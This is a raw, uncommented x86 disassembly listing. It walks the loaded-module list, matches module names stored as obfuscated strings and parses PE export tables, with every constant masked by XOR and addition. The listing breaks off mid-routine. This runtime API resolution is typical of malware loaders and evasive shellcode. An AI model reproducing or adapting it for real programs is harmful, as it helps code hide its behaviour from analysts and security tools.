  414175:	movzx  eax,WORD PTR [ecx+0x14]
  414179:	push   ebx
  41417a:	push   edi
  41417b:	xor    edi,edi
  41417d:	lea    eax,[eax+ecx*1+0x18]
  414181:	test   edx,edx
  414183:	je     0x4141a4
  414185:	mov    ecx,DWORD PTR [eax+0xc]
  414188:	lea    ebx,[ecx+esi*1]
  41418b:	cmp    DWORD PTR [ebp+0x8],ebx
  41418e:	jb     0x41419c
  414190:	mov    ebx,DWORD PTR [eax+0x8]
  414193:	add    ebx,ecx
  414195:	add    ebx,esi
  414197:	cmp    DWORD PTR [ebp+0x8],ebx
  41419a:	jb     0x4141a6
  41419c:	add    eax,0x28
  41419f:	inc    edi
  4141a0:	cmp    edi,edx
  4141a2:	jb     0x414185
  4141a4:	xor    eax,eax
  4141a6:	pop    edi
  4141a7:	pop    ebx
  4141a8:	pop    ebp
  4141a9:	ret    0x4
  4141ac:	push   ebp
  4141ad:	mov    ebp,esp
  4141af:	sub    esp,0x28
  4141b2:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  4141b9:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
  4141c0:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  4141c7:	mov    eax,0x4f9c
  4141cc:	mov    WORD PTR [ebp-0xc],ax
  4141d0:	mov    eax,0x4e7c
  4141d5:	mov    WORD PTR [ebp-0x4],ax
  4141d9:	mov    eax,0x4fa7
  4141de:	mov    WORD PTR [ebp-0x8],ax
  4141e2:	add    eax,0xffffffe0
  4141e5:	mov    WORD PTR [ebp-0x8],ax
  4141e9:	mov    eax,DWORD PTR [ebp+0x8]
  4141ec:	mov    DWORD PTR [ebp-0x14],eax
  4141ef:	mov    eax,DWORD PTR [ebp+0xc]
  4141f2:	mov    DWORD PTR [ebp-0x18],eax
  4141f5:	mov    eax,DWORD PTR [ebp-0x10]
  4141f8:	push   ebx
  4141f9:	mov    ecx,0x7510896
  4141fe:	xor    eax,ecx
  414200:	push   esi
  414201:	mov    esi,DWORD PTR [ebp-0x14]
  414204:	mov    edx,0x3272dd
  414209:	add    eax,edx
  41420b:	push   edi
  41420c:	cmp    esi,eax
  41420e:	je     0x41440c
  414214:	mov    eax,DWORD PTR [ebp-0x10]
  414217:	mov    esi,DWORD PTR [ebp-0x18]
  41421a:	xor    eax,ecx
  41421c:	add    eax,edx
  41421e:	cmp    esi,eax
  414220:	je     0x41440c
  414226:	mov    eax,DWORD PTR [ebp-0x10]
  414229:	xor    eax,ecx
  41422b:	add    eax,edx
  41422d:	mov    DWORD PTR [ebp-0x20],eax
  414230:	mov    eax,DWORD PTR [ebp-0x10]
  414233:	xor    eax,ecx
  414235:	add    eax,edx
  414237:	mov    DWORD PTR [ebp-0x24],eax
  41423a:	movzx  esi,WORD PTR [ebp-0x4]
  41423e:	movzx  edi,WORD PTR [ebp-0xc]
  414242:	mov    eax,0x8a89
  414247:	xor    si,ax
  41424a:	mov    ebx,0x8a89
  41424f:	xor    di,bx
  414252:	mov    eax,0x3b4c
  414257:	add    si,ax
  41425a:	add    di,ax
  41425d:	sub    edi,esi
  41425f:	mov    WORD PTR [ebp-0xc],di
  414263:	mov    esi,DWORD PTR [ebp-0x20]
  414266:	mov    edi,DWORD PTR [ebp-0x14]
  414269:	mov    si,WORD PTR [edi+esi*2]
  41426d:	mov    WORD PTR [ebp+0x8],si
  414271:	mov    esi,DWORD PTR [ebp-0x24]
  414274:	mov    edi,DWORD PTR [ebp-0x18]
  414277:	mov    si,WORD PTR [edi+esi*2]
  41427b:	mov    WORD PTR [ebp+0xc],si
  41427f:	mov    esi,0x72dd
  414284:	jmp    0x414391
  414289:	mov    edi,DWORD PTR [ebp-0x10]
  41428c:	mov    bx,WORD PTR [ebp+0xc]
  414290:	xor    edi,0x896
  414296:	add    edi,esi
  414298:	cmp    bx,di
  41429b:	je     0x4143bb
  4142a1:	mov    edi,DWORD PTR [ebp-0x10]
  4142a4:	mov    ebx,DWORD PTR [ebp+0x10]
  4142a7:	xor    edi,ecx
  4142a9:	add    edi,edx
  4142ab:	cmp    ebx,edi
  4142ad:	mov    di,WORD PTR [ebp+0xc]
  4142b1:	mov    bx,WORD PTR [ebp+0x8]
  4142b5:	je     0x414348
  4142bb:	cmp    bx,di
  4142be:	je     0x414351
  4142c4:	mov    di,WORD PTR [ebp-0x4]
  4142c8:	mov    ebx,0x8a89
  4142cd:	xor    di,bx
  4142d0:	mov    bx,WORD PTR [ebp+0x8]
  4142d4:	add    di,ax
  4142d7:	cmp    bx,di
  4142da:	jb     0x414302
  4142dc:	mov    di,WORD PTR [ebp-0x8]
  4142e0:	mov    ebx,0x8a89
  4142e5:	xor    di,bx
  4142e8:	mov    bx,WORD PTR [ebp+0x8]
  4142ec:	add    di,ax
  4142ef:	cmp    bx,di
  4142f2:	ja     0x414302
  4142f4:	movzx  edi,WORD PTR [ebp+0x8]
  4142f8:	movzx  ebx,WORD PTR [ebp-0xc]
  4142fc:	add    edi,ebx
  4142fe:	mov    WORD PTR [ebp+0x8],di
  414302:	mov    di,WORD PTR [ebp-0x4]
  414306:	mov    ebx,0x8a89
  41430b:	xor    di,bx
  41430e:	mov    bx,WORD PTR [ebp+0xc]
  414312:	add    di,ax
  414315:	cmp    bx,di
  414318:	jb     0x414340
  41431a:	mov    di,WORD PTR [ebp-0x8]
  41431e:	mov    ebx,0x8a89
  414323:	xor    di,bx
  414326:	mov    bx,WORD PTR [ebp+0xc]
  41432a:	add    di,ax
  41432d:	cmp    bx,di
  414330:	ja     0x414340
  414332:	movzx  edi,WORD PTR [ebp+0xc]
  414336:	movzx  ebx,WORD PTR [ebp-0xc]
  41433a:	add    edi,ebx
  41433c:	mov    WORD PTR [ebp+0xc],di
  414340:	mov    di,WORD PTR [ebp+0xc]
  414344:	mov    bx,WORD PTR [ebp+0x8]
  414348:	cmp    bx,di
  41434b:	jne    0x41440c
  414351:	mov    edi,DWORD PTR [ebp-0x28]
  414354:	mov    ebx,DWORD PTR [ebp-0x14]
  414357:	xor    edi,ecx
  414359:	lea    edi,[edi+ebx*1+0x3272dd]
  414360:	mov    DWORD PTR [ebp-0x14],edi
  414363:	mov    edi,DWORD PTR [ebp-0x28]
  414366:	mov    ebx,DWORD PTR [ebp-0x18]
  414369:	xor    edi,ecx
  41436b:	lea    edi,[edi+ebx*1+0x3272dd]
  414372:	mov    DWORD PTR [ebp-0x18],edi
  414375:	mov    edi,DWORD PTR [ebp-0x20]
  414378:	mov    ebx,DWORD PTR [ebp-0x14]
  41437b:	mov    di,WORD PTR [ebx+edi*2]
  41437f:	mov    WORD PTR [ebp+0x8],di
  414383:	mov    edi,DWORD PTR [ebp-0x24]
  414386:	mov    ebx,DWORD PTR [ebp-0x18]
  414389:	mov    di,WORD PTR [ebx+edi*2]
  41438d:	mov    WORD PTR [ebp+0xc],di
  414391:	mov    edi,DWORD PTR [ebp-0x10]
  414394:	mov    bx,WORD PTR [ebp+0x8]
  414398:	xor    edi,0x896
  41439e:	add    edi,esi
  4143a0:	cmp    bx,di
  4143a3:	jne    0x414289
  4143a9:	mov    esi,DWORD PTR [ebp-0x1c]
  4143ac:	xor    esi,ecx
  4143ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4143b1:	add    esi,edx
  4143b3:	imul   esi,ecx
  4143b6:	mov    DWORD PTR [ebp-0x10],esi
  4143b9:	jmp    0x4143cd
  4143bb:	mov    edx,DWORD PTR [ebp-0x10]
  4143be:	xor    edx,ecx
  4143c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4143c3:	lea    ecx,[edx+ecx*1+0x3272dd]
  4143ca:	mov    DWORD PTR [ebp-0x1c],ecx
  4143cd:	mov    edx,DWORD PTR [ebp-0x20]
  4143d0:	mov    esi,DWORD PTR [ebp-0x14]
  4143d3:	mov    si,WORD PTR [esi+edx*2]
  4143d7:	mov    ecx,eax
  4143d9:	sub    si,cx
  4143dc:	mov    edx,0x8a89
  4143e1:	xor    si,dx
  4143e4:	mov    ecx,0x4e3d
  4143e9:	cmp    si,cx
  4143ec:	jne    0x414407
  4143ee:	mov    esi,DWORD PTR [ebp-0x24]
  4143f1:	mov    edi,DWORD PTR [ebp-0x18]
  4143f4:	mov    si,WORD PTR [edi+esi*2]
  4143f8:	sub    si,ax
  4143fb:	xor    si,dx
  4143fe:	cmp    si,cx
  414401:	jne    0x414407
  414403:	xor    eax,eax
  414405:	jmp    0x414413
  414407:	xor    eax,eax
  414409:	inc    eax
  41440a:	jmp    0x414413
  41440c:	mov    eax,DWORD PTR [ebp-0x1c]
  41440f:	xor    eax,ecx
  414411:	add    eax,edx
  414413:	pop    edi
  414414:	pop    esi
  414415:	pop    ebx
  414416:	leave  
  414417:	ret    0xc
  41441a:	push   ebp
  41441b:	mov    ebp,esp
  41441d:	push   ecx
  41441e:	mov    cx,WORD PTR [eax]
  414421:	push   esi
  414422:	mov    esi,0x3b4c
  414427:	sub    cx,si
  41442a:	mov    esi,0x8a89
  41442f:	xor    cx,si
  414432:	mov    esi,0x4e3d
  414437:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41443e:	mov    edx,0xf89c85b5
  414443:	cmp    cx,si
  414446:	je     0x4144a5
  414448:	push   ebx
  414449:	push   edi
  41444a:	movzx  ecx,cx
  41444d:	mov    edi,0xffcd8d23
  414452:	mov    esi,0x7510896
  414457:	mov    ebx,0x4f99
  41445c:	cmp    cx,bx
  41445f:	jne    0x414464
  414461:	mov    DWORD PTR [ebp-0x4],edx
  414464:	lea    edx,[edi+0x1]
  414467:	xor    edx,esi
  414469:	mov    edi,edx
  41446b:	xor    edi,esi
  41446d:	mov    cx,WORD PTR [eax+edi*2+0x64e5ba]
  414475:	mov    ebx,0x3b4c
  41447a:	sub    cx,bx
  41447d:	mov    ebx,0x8a89
  414482:	xor    cx,bx
  414485:	mov    ebx,0x4e3d
  41448a:	cmp    cx,bx
  41448d:	jne    0x414457
  41448f:	mov    ecx,DWORD PTR [ebp-0x4]
  414492:	pop    edi
  414493:	pop    ebx
  414494:	cmp    ecx,0xf89c85b4
  41449a:	je     0x4144a5
  41449c:	xor    ecx,esi
  41449e:	lea    eax,[eax+ecx*2+0x64e5bc]
  4144a5:	pop    esi
  4144a6:	leave  
  4144a7:	ret    
  4144a8:	push   ebp
  4144a9:	mov    ebp,esp
  4144ab:	push   ecx
  4144ac:	push   esi
  4144ad:	push   edi
  4144ae:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  4144b5:	mov    esi,0xf89c85b5
  4144ba:	call   0x41441a
  4144bf:	mov    edi,eax
  4144c1:	mov    al,BYTE PTR [edi]
  4144c3:	add    al,0xb
  4144c5:	xor    al,0x71
  4144c7:	cmp    al,0x7a
  4144c9:	je     0x41452c
  4144cb:	mov    eax,edi
  4144cd:	mov    edx,0xffcd8d23
  4144d2:	mov    ecx,0x7510896
  4144d7:	push   ebx
  4144d8:	mov    ax,WORD PTR [eax]
  4144db:	mov    ebx,0x3b4c
  4144e0:	sub    ax,bx
  4144e3:	mov    ebx,0x8a89
  4144e8:	xor    ax,bx
  4144eb:	mov    ebx,0x4e6b
  4144f0:	cmp    ax,bx
  4144f3:	jne    0x4144f8
  4144f5:	mov    DWORD PTR [ebp-0x4],esi
  4144f8:	lea    esi,[edx+0x1]
  4144fb:	xor    esi,ecx
  4144fd:	mov    edx,esi
  4144ff:	xor    edx,ecx
  414501:	lea    eax,[edi+edx*2+0x64e5ba]
  414508:	mov    bl,BYTE PTR [eax]
  41450a:	add    bl,0xb
  41450d:	xor    bl,0x71
  414510:	cmp    bl,0x7a
  414513:	jne    0x4144d8
  414515:	mov    eax,DWORD PTR [ebp-0x4]
  414518:	pop    ebx
  414519:	cmp    eax,0xf89c85b4
  41451e:	je     0x41452c
  414520:	xor    eax,ecx
  414522:	xor    ecx,ecx
  414524:	mov    WORD PTR [edi+eax*2+0x64e5ba],cx
  41452c:	mov    eax,edi
  41452e:	pop    edi
  41452f:	pop    esi
  414530:	leave  
  414531:	ret    
  414532:	push   ebp
  414533:	mov    ebp,esp
  414535:	push   ecx
  414536:	push   esi
  414537:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41453e:	mov    esi,0xf89c85b5
  414543:	call   0x41441a
  414548:	mov    cx,WORD PTR [eax]
  41454b:	mov    edx,0x3b4c
  414550:	sub    cx,dx
  414553:	mov    edx,0x8a89
  414558:	xor    cx,dx
  41455b:	mov    edx,0x4e3d
  414560:	cmp    cx,dx
  414563:	je     0x4145bc
  414565:	push   ebx
  414566:	push   edi
  414567:	movzx  ecx,cx
  41456a:	mov    edx,0xffcd8d23
  41456f:	mov    edi,0x7510896
  414574:	mov    ebx,0x4e6b
  414579:	cmp    cx,bx
  41457c:	jne    0x414581
  41457e:	mov    DWORD PTR [ebp-0x4],esi
  414581:	lea    esi,[edx+0x1]
  414584:	xor    esi,edi
  414586:	mov    edx,esi
  414588:	xor    edx,edi
  41458a:	mov    cx,WORD PTR [eax+edx*2+0x64e5ba]
  414592:	mov    ebx,0x3b4c
  414597:	sub    cx,bx
  41459a:	mov    ebx,0x8a89
  41459f:	xor    cx,bx
  4145a2:	mov    ebx,0x4e3d
  4145a7:	cmp    cx,bx
  4145aa:	jne    0x414574
  4145ac:	cmp    DWORD PTR [ebp-0x4],0xf89c85b4
  4145b3:	pop    edi
  4145b4:	pop    ebx
  4145b5:	je     0x4145bc
  4145b7:	xor    eax,eax
  4145b9:	inc    eax
  4145ba:	jmp    0x4145be
  4145bc:	xor    eax,eax
  4145be:	pop    esi
  4145bf:	leave  
  4145c0:	ret    
  4145c1:	push   ebp
  4145c2:	mov    ebp,esp
  4145c4:	push   ecx
  4145c5:	mov    eax,DWORD PTR [ebp+0x8]
  4145c8:	movzx  ecx,WORD PTR [eax]
  4145cb:	push   esi
  4145cc:	lea    eax,[ecx-0x3b4c]
  4145d2:	mov    esi,0x8a89
  4145d7:	push   edi
  4145d8:	xor    eax,esi
  4145da:	mov    edi,0x4e3d
  4145df:	mov    DWORD PTR [ebp-0x4],edx
  4145e2:	cmp    ax,di
  4145e5:	je     0x414612
  4145e7:	mov    eax,DWORD PTR [ebp+0x8]
  4145ea:	sub    eax,edx
  4145ec:	mov    DWORD PTR [ebp+0x8],eax
  4145ef:	jmp    0x4145f4
  4145f1:	mov    eax,DWORD PTR [ebp+0x8]
  4145f4:	mov    WORD PTR [edx],cx
  4145f7:	add    edx,0x2
  4145fa:	movzx  edi,WORD PTR [eax+edx*1]
  4145fe:	mov    ecx,edi
  414600:	add    edi,0xffffc4b4
  414606:	xor    edi,esi
  414608:	mov    eax,0x4e3d
  41460d:	cmp    di,ax
  414610:	jne    0x4145f1
  414612:	xor    eax,eax
  414614:	pop    edi
  414615:	mov    WORD PTR [edx],ax
  414618:	mov    eax,DWORD PTR [ebp-0x4]
  41461b:	pop    esi
  41461c:	leave  
  41461d:	ret    0x4
  414620:	push   ebp
  414621:	mov    ebp,esp
  414623:	sub    esp,0x18
  414626:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  41462d:	mov    DWORD PTR [ebp-0x18],0xf89c85b2
  414634:	mov    eax,DWORD PTR [ebp-0x14]
  414637:	xor    eax,0x7510896
  41463c:	add    eax,0x3272dd
  414641:	mov    DWORD PTR [ebp-0x8],eax
  414644:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41464b:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  414652:	mov    DWORD PTR [ebp-0x4],0xf89c85b3
  414659:	mov    eax,DWORD PTR [ebp-0x14]
  41465c:	xor    eax,0x7510896
  414661:	mov    ecx,DWORD PTR [ebp-0x8]
  414664:	lea    eax,[ecx+eax*1+0x3272dd]
  41466b:	mov    ecx,DWORD PTR [ebp-0x18]
  41466e:	xor    ecx,0x7510896
  414674:	add    ecx,0x3272dd
  41467a:	mov    edx,DWORD PTR [ebp+0x10]
  41467d:	imul   edx,ecx
  414680:	cmp    eax,edx
  414682:	jae    0x414775
  414688:	mov    eax,DWORD PTR [ebp+0x10]
  41468b:	mov    ecx,DWORD PTR [ebp-0x8]
  41468e:	sub    eax,ecx
  414690:	mov    ecx,DWORD PTR [ebp-0x10]
  414693:	xor    ecx,0x7510896
  414699:	add    ecx,0x3272dd
  41469f:	cmp    eax,ecx
  4146a1:	jbe    0x4146d3
  4146a3:	mov    eax,DWORD PTR [ebp+0x8]
  4146a6:	add    eax,DWORD PTR [ebp-0x8]
  4146a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4146ac:	add    ecx,DWORD PTR [ebp-0x8]
  4146af:	mov    edx,DWORD PTR [ecx]
  4146b1:	mov    DWORD PTR [eax],edx
  4146b3:	mov    ecx,DWORD PTR [ecx+0x4]
  4146b6:	mov    DWORD PTR [eax+0x4],ecx
  4146b9:	mov    eax,DWORD PTR [ebp-0x10]
  4146bc:	xor    eax,0x7510896
  4146c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4146c4:	lea    eax,[ecx+eax*1+0x3272dd]
  4146cb:	mov    DWORD PTR [ebp-0x8],eax
  4146ce:	jmp    0x414770
  4146d3:	mov    eax,DWORD PTR [ebp+0x10]
  4146d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4146d9:	sub    eax,ecx
  4146db:	mov    ecx,DWORD PTR [ebp-0xc]
  4146de:	xor    ecx,0x7510896
  4146e4:	add    ecx,0x3272dd
  4146ea:	cmp    eax,ecx
  4146ec:	jbe    0x414715
  4146ee:	mov    eax,DWORD PTR [ebp+0x8]
  4146f1:	add    eax,DWORD PTR [ebp-0x8]
  4146f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4146f7:	add    ecx,DWORD PTR [ebp-0x8]
  4146fa:	mov    ecx,DWORD PTR [ecx]
  4146fc:	mov    DWORD PTR [eax],ecx
  4146fe:	mov    eax,DWORD PTR [ebp-0xc]
  414701:	xor    eax,0x7510896
  414706:	mov    ecx,DWORD PTR [ebp-0x8]
  414709:	lea    eax,[ecx+eax*1+0x3272dd]
  414710:	mov    DWORD PTR [ebp-0x8],eax
  414713:	jmp    0x414770
  414715:	mov    eax,DWORD PTR [ebp+0x10]
  414718:	mov    ecx,DWORD PTR [ebp-0x8]
  41471b:	sub    eax,ecx
  41471d:	mov    ecx,DWORD PTR [ebp-0x4]
  414720:	xor    ecx,0x7510896
  414726:	add    ecx,0x3272dd
  41472c:	cmp    eax,ecx
  41472e:	jbe    0x414759
  414730:	mov    eax,DWORD PTR [ebp+0x8]
  414733:	add    eax,DWORD PTR [ebp-0x8]
  414736:	mov    ecx,DWORD PTR [ebp+0xc]
  414739:	add    ecx,DWORD PTR [ebp-0x8]
  41473c:	mov    cx,WORD PTR [ecx]
  41473f:	mov    WORD PTR [eax],cx
  414742:	mov    eax,DWORD PTR [ebp-0x4]
  414745:	xor    eax,0x7510896
  41474a:	mov    ecx,DWORD PTR [ebp-0x8]
  41474d:	lea    eax,[ecx+eax*1+0x3272dd]
  414754:	mov    DWORD PTR [ebp-0x8],eax
  414757:	jmp    0x414770
  414759:	mov    eax,DWORD PTR [ebp+0x8]
  41475c:	add    eax,DWORD PTR [ebp-0x8]
  41475f:	mov    ecx,DWORD PTR [ebp+0xc]
  414762:	add    ecx,DWORD PTR [ebp-0x8]
  414765:	mov    cl,BYTE PTR [ecx]
  414767:	mov    BYTE PTR [eax],cl
  414769:	mov    eax,DWORD PTR [ebp-0x8]
  41476c:	inc    eax
  41476d:	mov    DWORD PTR [ebp-0x8],eax
  414770:	jmp    0x414659
  414775:	leave  
  414776:	ret    0xc
  414779:	push   ebp
  41477a:	mov    ebp,esp
  41477c:	push   ecx
  41477d:	push   ecx
  41477e:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  414785:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  41478c:	xor    eax,eax
  41478e:	inc    eax
  41478f:	je     0x4147d1
  414791:	mov    eax,DWORD PTR [ebp-0x4]
  414794:	xor    eax,0x7510896
  414799:	add    eax,0x3272dd
  41479e:	cmp    DWORD PTR [ebp+0xc],eax
  4147a1:	jne    0x4147a5
  4147a3:	jmp    0x4147d1
  4147a5:	mov    eax,DWORD PTR [ebp-0x8]
  4147a8:	xor    eax,0x7510896
  4147ad:	add    eax,0x3272dd
  4147b2:	mov    ecx,DWORD PTR [ebp+0xc]
  4147b5:	sub    ecx,eax
  4147b7:	mov    DWORD PTR [ebp+0xc],ecx
  4147ba:	mov    eax,DWORD PTR [ebp-0x4]
  4147bd:	xor    eax,0x7510896
  4147c2:	add    eax,0x3272dd
  4147c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4147ca:	add    ecx,DWORD PTR [ebp+0xc]
  4147cd:	mov    BYTE PTR [ecx],al
  4147cf:	jmp    0x41478c
  4147d1:	leave  
  4147d2:	ret    0x8
  4147d5:	push   ebp
  4147d6:	mov    ebp,esp
  4147d8:	sub    esp,0x21c
  4147de:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4147e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4147ec:	mov    eax,DWORD PTR [ebp+0x10]
  4147ef:	mov    eax,DWORD PTR [ebp-0x4]
  4147f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4147f5:	push   esi
  4147f6:	push   edi
  4147f7:	mov    edi,0x7510896
  4147fc:	xor    eax,edi
  4147fe:	mov    esi,0x3272dd
  414803:	add    eax,esi
  414805:	cmp    eax,ecx
  414807:	mov    eax,DWORD PTR [ebp-0x4]
  41480a:	jne    0x414815
  41480c:	xor    eax,edi
  41480e:	add    eax,esi
  414810:	jmp    0x4148c1
  414815:	mov    ecx,DWORD PTR [ebp+0xc]
  414818:	xor    eax,edi
  41481a:	add    eax,esi
  41481c:	cmp    eax,ecx
  41481e:	jne    0x414825
  414820:	mov    eax,DWORD PTR [ebp-0x4]
  414823:	jmp    0x41480c
  414825:	lea    eax,[ebp-0x21c]
  41482b:	mov    DWORD PTR [ebp-0x8],eax
  41482e:	mov    eax,DWORD PTR [ebp+0xc]
  414831:	mov    DWORD PTR [ebp-0x10],eax
  414834:	mov    eax,DWORD PTR [ebp-0x4]
  414837:	xor    eax,edi
  414839:	add    eax,esi
  41483b:	mov    DWORD PTR [ebp+0x10],eax
  41483e:	mov    eax,DWORD PTR [ebp+0xc]
  414841:	push   ebx
  414842:	call   0x414532
  414847:	mov    ebx,eax
  414849:	mov    eax,DWORD PTR [ebp+0x8]
  41484c:	mov    eax,DWORD PTR [eax+0x14]
  41484f:	jmp    0x4148a9
  414851:	mov    eax,DWORD PTR [ebp+0xc]
  414854:	sub    eax,0x8
  414857:	mov    DWORD PTR [ebp-0xc],eax
  41485a:	mov    eax,DWORD PTR [ebp-0xc]
  41485d:	mov    eax,DWORD PTR [eax+0x28]
  414860:	call   0x41441a
  414865:	mov    DWORD PTR [ebp+0x10],eax
  414868:	push   DWORD PTR [ebp+0x10]
  41486b:	mov    edx,DWORD PTR [ebp-0x8]
  41486e:	call   0x4145c1
  414873:	mov    eax,DWORD PTR [ebp-0x4]
  414876:	xor    eax,edi
  414878:	add    eax,esi
  41487a:	cmp    eax,ebx
  41487c:	jne    0x414886
  41487e:	mov    eax,DWORD PTR [ebp-0x8]
  414881:	call   0x4144a8
  414886:	mov    eax,DWORD PTR [ebp-0x14]
  414889:	xor    eax,edi
  41488b:	add    eax,esi
  41488d:	push   eax
  41488e:	push   DWORD PTR [ebp-0x10]
  414891:	push   DWORD PTR [ebp-0x8]
  414894:	call   0x4141ac
  414899:	mov    ecx,DWORD PTR [ebp-0x4]
  41489c:	xor    ecx,edi
  41489e:	add    ecx,esi
  4148a0:	cmp    eax,ecx
  4148a2:	je     0x4148c7
  4148a4:	mov    eax,DWORD PTR [ebp+0xc]
  4148a7:	mov    eax,DWORD PTR [eax]
  4148a9:	mov    DWORD PTR [ebp+0xc],eax
  4148ac:	mov    eax,DWORD PTR [ebp+0x8]
  4148af:	mov    ecx,DWORD PTR [ebp+0xc]
  4148b2:	add    eax,0x14
  4148b5:	cmp    ecx,eax
  4148b7:	jne    0x414851
  4148b9:	mov    eax,DWORD PTR [ebp-0x4]
  4148bc:	xor    eax,edi
  4148be:	add    eax,esi
  4148c0:	pop    ebx
  4148c1:	pop    edi
  4148c2:	pop    esi
  4148c3:	leave  
  4148c4:	ret    0xc
  4148c7:	mov    eax,DWORD PTR [ebp-0xc]
  4148ca:	mov    eax,DWORD PTR [eax+0x18]
  4148cd:	jmp    0x4148c0
  4148cf:	push   ebp
  4148d0:	mov    ebp,esp
  4148d2:	mov    eax,DWORD PTR [ebp+0xc]
  4148d5:	sub    esp,0x10
  4148d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4148dc:	push   ebx
  4148dd:	push   esi
  4148de:	push   edi
  4148df:	je     0x414994
  4148e5:	test   eax,eax
  4148e7:	je     0x414994
  4148ed:	movzx  eax,WORD PTR [eax+0x20]
  4148f1:	mov    ecx,eax
  4148f3:	mov    DWORD PTR [ebp-0x10],eax
  4148f6:	xor    edx,edx
  4148f8:	and    DWORD PTR [ebp-0x8],edx
  4148fb:	mov    eax,0x8a89
  414900:	xor    ecx,eax
  414902:	add    ecx,0x3b4c
  414908:	mov    DWORD PTR [ebp-0xc],ecx
  41490b:	and    DWORD PTR [ebp-0x4],0x0
  41490f:	xor    ecx,ecx
  414911:	push   0x7c
  414913:	pop    edi
  414914:	cmp    cx,WORD PTR [ebp-0xc]
  414918:	jae    0x41497e
  41491a:	lea    esi,[edx-0x3b4c]
  414920:	xor    esi,eax
  414922:	movzx  ecx,WORD PTR [ebp-0x4]
  414926:	mov    ebx,DWORD PTR [ebp+0xc]
  414929:	lea    ecx,[ebx+ecx*4]
  41492c:	cmp    WORD PTR [ecx+0x2],si
  414930:	jne    0x414969
  414932:	movzx  ecx,WORD PTR [ecx]
  414935:	mov    edi,0x4e3d
  41493a:	cmp    cx,di
  41493d:	jne    0x41494b
  41493f:	mov    ebx,DWORD PTR [ebp+0x8]
  414942:	movzx  edi,dx
  414945:	cmp    BYTE PTR [edi+ebx*1],0x0
  414949:	je     0x414978
  41494b:	mov    ebx,DWORD PTR [ebp+0x8]
  41494e:	movzx  edi,dx
  414951:	movsx  di,BYTE PTR [edi+ebx*1]
  414956:	mov    ebx,0x3b4c
  41495b:	sub    di,bx
  41495e:	xor    di,ax
  414961:	cmp    cx,di
  414964:	je     0x414978
  414966:	push   0x7a
  414968:	pop    edi
  414969:	inc    DWORD PTR [ebp-0x4]
  41496c:	mov    cx,WORD PTR [ebp-0xc]
  414970:	cmp    WORD PTR [ebp-0x4],cx
  414974:	jb     0x414922
  414976:	jmp    0x41497e
  414978:	inc    DWORD PTR [ebp-0x8]
  41497b:	push   0x7d
  41497d:	pop    edi
  41497e:	mov    esi,DWORD PTR [ebp+0x8]
  414981:	movzx  ecx,dx
  414984:	cmp    BYTE PTR [ecx+esi*1],0x0
  414988:	je     0x41499d
  41498a:	inc    edx
  41498b:	cmp    edi,0x7a
  41498e:	jne    0x41490b
  414994:	xor    eax,eax
  414996:	pop    edi
  414997:	pop    esi
  414998:	pop    ebx
  414999:	leave  
  41499a:	ret    0x8
  41499d:	mov    ecx,DWORD PTR [ebp-0x8]
  4149a0:	add    ecx,0xffffc4b4
  4149a6:	xor    cx,ax
  4149a9:	xor    eax,eax
  4149ab:	cmp    cx,WORD PTR [ebp-0x10]
  4149af:	sete   al
  4149b2:	jmp    0x414996
  4149b4:	push   ebp
  4149b5:	mov    ebp,esp
  4149b7:	sub    esp,0x50
  4149ba:	push   edi
  4149bb:	mov    edi,eax
  4149bd:	mov    eax,DWORD PTR [edi+0x1a8]
  4149c3:	cmp    DWORD PTR [eax],0x0
  4149c6:	jne    0x4149cf
  4149c8:	xor    eax,eax
  4149ca:	jmp    0x414aff
  4149cf:	push   0x2c
  4149d1:	push   DWORD PTR [ebp+0x8]
  4149d4:	call   0x414779
  4149d9:	mov    edx,DWORD PTR [edi+0x1ac]
  4149df:	lea    eax,[edi+0x22]
  4149e2:	mov    DWORD PTR [ebp-0x4c],eax
  4149e5:	lea    eax,[edi+0x44]
  4149e8:	mov    DWORD PTR [ebp-0x48],eax
  4149eb:	lea    eax,[edi+0x66]
  4149ee:	mov    DWORD PTR [ebp-0x44],eax
  4149f1:	lea    eax,[edi+0x88]
  4149f7:	mov    DWORD PTR [ebp-0x40],eax
  4149fa:	lea    eax,[edi+0xaa]
  414a00:	mov    DWORD PTR [ebp-0x3c],eax
  414a03:	lea    eax,[edi+0xcc]
  414a09:	mov    DWORD PTR [ebp-0x38],eax
  414a0c:	lea    eax,[edi+0xee]
  414a12:	mov    DWORD PTR [ebp-0x34],eax
  414a15:	lea    eax,[edi+0x110]
  414a1b:	mov    DWORD PTR [ebp-0x30],eax
  414a1e:	lea    eax,[edi+0x132]
  414a24:	mov    DWORD PTR [ebp-0x2c],eax
  414a27:	lea    eax,[edi+0x154]
  414a2d:	push   edi
  414a2e:	mov    DWORD PTR [ebp-0x50],edi
  414a31:	mov    DWORD PTR [ebp-0x28],eax
  414a34:	call   0x414b33
  414a39:	push   eax
  414a3a:	mov    eax,DWORD PTR [edi+0x1a8]
  414a40:	push   DWORD PTR [eax]
  414a42:	call   0x4147d5
  414a47:	mov    DWORD PTR [ebp-0x10],eax
  414a4a:	test   eax,eax
  414a4c:	je     0x414aff
  414a52:	mov    ecx,DWORD PTR [eax+0x3c]
  414a55:	push   ebx
  414a56:	push   esi
  414a57:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  414a5b:	add    esi,eax
  414a5d:	mov    edi,DWORD PTR [esi+0x24]
  414a60:	mov    ecx,DWORD PTR [esi+0x1c]
  414a63:	mov    edx,DWORD PTR [esi+0x20]
  414a66:	mov    ebx,DWORD PTR [esi+0x18]
  414a69:	add    edi,eax
